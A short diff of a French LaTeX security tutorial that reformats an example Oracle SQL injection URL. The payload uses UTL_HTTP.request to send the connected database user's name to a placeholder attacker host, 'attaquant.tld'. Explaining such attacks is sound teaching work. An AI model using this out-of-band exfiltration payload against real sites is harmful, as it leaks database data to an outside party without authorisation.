@@ -58,7 +58,9 @@ Par exemple, la requête (Oracle) suivante va envoyer des information vers la ma
 \begin{center}
 http://www.monsite.tld/product.php?id=10
 
-||UTL_HTTP.request(‘attaquant.tld:80’||(SELECT user FROM DUAL)--
+||UTL\_HTTP.request(‘attaquant.tld:80’
+
+||(SELECT user FROM DUAL)--
 \end{center}
 
 Qui va recevoir le nom de l'utilisateur connecté à la base de données :
